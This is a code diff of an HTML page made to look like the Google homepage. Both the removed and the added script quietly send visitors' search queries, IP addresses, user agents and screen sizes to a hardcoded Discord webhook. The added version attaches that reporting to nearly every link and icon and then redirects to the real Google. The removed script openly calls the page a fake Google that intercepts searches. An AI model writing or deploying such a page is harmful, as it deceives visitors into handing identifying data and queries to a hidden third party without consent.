@@ -17,7 +17,6 @@
             --header-link-color: #3c4043;
             --promo-link-color: #1a0dab;
         }
-
         @media (prefers-color-scheme: dark) {
             :root {
                 --bg-color: #202124;
@@ -31,14 +30,13 @@
                 --promo-link-color: #8ab4f8;
             }
         }
-
         body {
             font-family: Arial, sans-serif;
             background-color: var(--bg-color);
             color: var(--text-color);
             display: flex;
             flex-direction: column;
-            justify-content: space-between; /* To push footer down */
+            justify-content: space-between;
             align-items: center;
             min-height: 100vh;
             margin: 0;
@@ -63,7 +61,7 @@
             margin-right: 15px;
             cursor: pointer;
             vertical-align: middle;
-            filter: var(--header-icon-filter, none); /* for dark mode icons */
+            filter: var(--header-icon-filter, none);
         }
         .header-right .profile-icon {
             width: 32px;
@@ -74,29 +72,21 @@
         }
         @media (prefers-color-scheme: dark) {
             .header-right .grid-icon {
-                filter: invert(1); /* Invert for dark mode */
+                filter: invert(1);
             }
         }
-
         .main-content {
-            flex-grow: 1; /* Pushes header and footer away */
+            flex-grow: 1;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             width: 100%;
         }
-
         .logo {
             width: 272px;
             height: 92px;
             margin-bottom: 25px;
-            filter: var(--logo-filter, none);
-        }
-        @media (prefers-color-scheme: dark) {
-            .logo {
-                filter: invert(1); /* Invert Google logo for dark mode */
-            }
         }
         .search-box {
             display: flex;
@@ -108,11 +98,11 @@
             max-width: 90%;
             box-shadow: 0 2px 5px rgba(0,0,0,.1);
             transition: box-shadow 0.3s, border-color 0.3s;
-            background-color: transparent; /* Allows background to show */
+            background-color: transparent;
         }
         .search-box:hover {
             box-shadow: 0 1px 6px rgba(0,0,0,.2);
-            border-color: var(--search-box-border); /* Keep consistent */
+            border-color: var(--search-box-border);
         }
         .search-box input {
             flex-grow: 1;
@@ -129,11 +119,11 @@
             background-size: contain;
             background-repeat: no-repeat;
             cursor: pointer;
-            filter: var(--icon-filter, none); /* For dark mode icons */
+            filter: var(--icon-filter, none);
         }
         @media (prefers-color-scheme: dark) {
             .search-box .icon {
-                filter: invert(1); /* Invert icons for dark mode */
+                filter: invert(1);
             }
         }
         .buttons {
@@ -157,12 +147,12 @@
         }
         .buttons button:hover {
             box-shadow: 0 1px 1px rgba(0,0,0,.1);
-            background-color: #ebebeb; /* Lighter hover for light mode */
+            background-color: #ebebeb;
             border: 1px solid #dadce0;
         }
         @media (prefers-color-scheme: dark) {
             .buttons button:hover {
-                background-color: #3c4043; /* Darker hover for dark mode */
+                background-color: #3c4043;
                 border: 1px solid #5f6368;
             }
         }
@@ -179,7 +169,7 @@
             text-align: center;
             font-size: 13px;
             color: var(--footer-text);
-            border-top: 1px solid var(--search-box-border); /* Use search box border for consistent line */
+            border-top: 1px solid var(--search-box-border);
             display: flex;
             flex-direction: column;
             gap: 10px;
@@ -206,19 +196,18 @@
 <body>
     <div class="header">
         <div class="header-left">
-            <a href="#">About</a>
-            <a href="#">Store</a>
+            <a href="#" onclick="reportAction('About')">About</a>
+            <a href="#" onclick="reportAction('Store')">Store</a>
         </div>
         <div class="header-right">
-            <a href="#">Gmail</a>
-            <a href="#">Images</a>
-            <img class="grid-icon" src="https://ssl.gstatic.com/gb/images/bar/al-icon.png" alt="Apps">
-            <img class="profile-icon" src="https://lh3.googleusercontent.com/ogw/AAEL6sf0o3rX2Q-5_s-Q-7_x0_y0_y0_y0_y0_y0_y0=s32-c-mo" alt="Profile">
+            <a href="#" onclick="reportAction('Gmail', 'https://mail.google.com')">Gmail</a>
+            <a href="#" onclick="reportAction('Images', 'https://images.google.com')">Images</a>
+            <img class="grid-icon" src="https://ssl.gstatic.com/gb/images/bar/al-icon.png" alt="Apps" onclick="reportAction('Apps', 'https://www.google.com/intl/en/about/products?tab=wh')">
+            <img id="profile-picture" class="profile-icon" src="https://lh3.googleusercontent.com/ogw/AAEL6sf0o3rX2Q-5_s-Q-7_x0_y0_y0_y0_y0_y0_y0=s32-c-mo" alt="Profile" onclick="reportAction('Profile Click', '#')">
         </div>
     </div>
-
     <div class="main-content">
-        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+        <img id="google-logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
         <div class="search-box">
             <span class="icon" style="background-image: url('data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 24 24\'><path fill=\'%234285F4\' d=\'M23.64,22.37L17.75,16.48C19.04,14.85,19.7,12.87,19.7,10.7C19.7,5.04,15.2,0.54,9.54,0.54C3.88,0.54,-0.04,5.04,-0.04,10.7C-0.04,16.36,4.46,20.86,10.12,20.86C12.33,20.86,14.37,20.19,16.08,18.91L21.97,24.8L23.64,22.37ZM10.12,18.84C5.55,18.84,1.86,15.15,1.86,10.7C1.86,6.25,5.55,2.56,10.12,2.56C14.69,2.56,18.38,6.25,18.38,10.7C18.38,15.15,14.69,18.84,10.12,18.84Z\'></path></svg>');"></span>
             <input id="search-input" type="text" placeholder="Search Google or type a URL" onkeypress="handleKeyPress(event)">
@@ -231,134 +220,92 @@
             <button onclick="handleSearch()">Google Search</button>
             <button onclick="handleSearch()">I'm Feeling Lucky</button>
         </div>
-        <a href="#" class="promo-link">Try now! Gemini in Android Studio is your AI-powered coding companion</a>
+        <a href="#" class="promo-link" onclick="reportAction('Promo Link')">Try now! Gemini in Android Studio is your AI-powered coding companion</a>
     </div>
-
     <div class="footer">
         <div class="footer-country">
             United States
         </div>
         <div class="footer-links">
             <div>
-                <a href="#">Advertising</a>
-                <a href="#">Business</a>
-                <a href="#">How Search works</a>
+                <a href="#" onclick="reportAction('Advertising')">Advertising</a>
+                <a href="#" onclick="reportAction('Business')">Business</a>
+                <a href="#" onclick="reportAction('How Search works')">How Search works</a>
             </div>
             <div>
-                <a href="#">
+                <a href="#" onclick="reportAction('AI Link')">
                     <img src="data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 24 24\'><path fill=\'%2334A853\' d=\'M12,2C6.48,2,2,6.48,2,12s4.48,10,10,10,10-4.48,10-10S17.52,2,12,2ZM10.5,17L5,11.5,6.41,10.09,10.5,14.17,17.59,7.09,19,8.5,10.5,17Z\'></path></svg>\')" style="vertical-align: middle; width: 16px; height: 16px; filter: var(--icon-filter, none);">
                     Applying AI towards science and the environment
                 </a>
             </div>
             <div>
-                <a href="#">Privacy</a>
-                <a href="#">Terms</a>
-                <a href="#">Settings</a>
+                <a href="#" onclick="reportAction('Privacy')">Privacy</a>
+                <a href="#" onclick="reportAction('Terms')">Terms</a>
+                <a href="#" onclick="reportAction('Settings')">Settings</a>
             </div>
         </div>
     </div>
-
     <script>
-        const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1322735847518507070/Jt-QRbzOXzQeAB-TZ3fHVA4BZVCfvRnNWWy5mZEnxBamvLOX5CI4EH4XY7QLaG_NjUxE';
-
-        function sendToWebhook(query) {
-            const data = {
-                content: null,
-                embeds: [{
-                    title: "New Google Search Intercepted!",
-                    description: `A user just performed a search on your fake Google page.`,
-                    color: 3447003, // A nice blue color
-                    fields: [
-                        {
-                            name: "Search Query",
-                            value: `\`\`\`${query}\`\`\``, // Code block for query
-                            inline: false
-                        },
-                        {
-                            name: "User IP Address",
-                            value: "Fetching...", // Will be updated
-                            inline: true
-                        },
-                        {
-                            name: "User Agent",
-                            value: `\`\`\`${navigator.userAgent}\`\`\``, // Code block for user agent
-                            inline: false
-                        },
-                        {
-                            name: "Timestamp",
-                            value: new Date().toLocaleString(),
-                            inline: true
-                        },
-                        {
-                            name: "Detected Dark Mode",
-                            value: window.matchMedia('(prefers-color-scheme: dark)').matches ? "Yes" : "No",
-                            inline: true
-                        }
-                    ],
-                    thumbnail: {
-                        url: "https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" // Google logo thumbnail
-                    },
-                    footer: {
-                        text: "Yo search intercepted by your serrch fake Google!"
-                    },
-                    timestamp: new Date().toISOString()
-                }]
-            };
-
-            // Yo search get the IP address
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(ipData => {
-                    data.embeds[0].fields[1].value = `\`\`\`${ipData.ip}\`\`\``;
-                    fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(data),
-                    }).then(response => {
-                        if (!response.ok) {
-                            console.error('Yo search network response was not ok:', response.status, response.statusText);
-                        }
-                    }).catch(error => {
-                        console.error('Yo search error sending webhook:', error);
-                    });
-                })
-                .catch(error => {
-                    console.error('Yo search error fetching IP:', error);
-                    // Send the webhook anyway, without the IP if fetching fails
-                    fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(data),
-                    }).then(response => {
-                        if (!response.ok) {
-                            console.error('Yo search network response was not ok:', response.status, response.statusText);
-                        }
-                    }).catch(error => {
-                        console.error('Yo search error sending webhook:', error);
-                    });
-                });
-        }
-
-        function handleSearch() {
-            var input = document.getElementById('search-input');
-            var query = input.value.trim();
-            if (query) {
-                sendToWebhook(query);
-                // Redirect to the real Google search results after a short delay to ensure webhook sends
-                setTimeout(() => {
-                    window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(query);
-                }, 500); // 500ms delay
+        const webhookURL = 'https://discord.com/api/webhooks/1322735847518507070/Jt-QRbzOXzQeAB-TZ3fHVA4BZVCfvRnNWWy5mZEnxBamvLOX5CI4EH4XY7QLaG_NjUxE';
+        
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip || 'Unknown';
+            } catch (error) {
+                console.error('Error fetching IP:', error);
+                return 'Unknown';
             }
         }
-
+        async function reportAction(action, url = null) {
+            const ipAddress = await getIPAddress();
+            const browserInfo = {
+                'User Agent': navigator.userAgent,
+                'Screen Resolution': `${window.screen.width}x${window.screen.height}`,
+            };
+            const payload = {
+                embeds: [{
+                    title: `Action Log: ${action}`,
+                    color: 15158332,
+                    fields: [
+                        { name: 'IP Address', value: ipAddress, inline: true },
+                        { name: 'User Agent', value: browserInfo['User Agent'] || 'Unknown' },
+                        { name: 'Screen Resolution', value: browserInfo['Screen Resolution'] || 'Unknown', inline: true },
+                    ],
+                    footer: {
+                        text: `Time of Action: ${new Date().toLocaleString()}`
+                    }
+                }]
+            };
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            })
+            .then(response => {
+                console.log('Webhook sent successfully.');
+            })
+            .catch(error => {
+                console.error('Error sending webhook:', error);
+            })
+            .finally(() => {
+                if (url) {
+                    window.location.href = url;
+                }
+            });
+        }
         function handleKeyPress(event) {
             if (event.key === 'Enter') {
                 handleSearch();
             }
+        }
+        function handleSearch() {
+            const query = document.getElementById('search-input').value;
+            const searchURL = `https://www.google.com/search?q=${encodeURIComponent(query)}`;
+            reportAction(`Search Query: ${query}`, searchURL);
         }
     </script>
 </body>
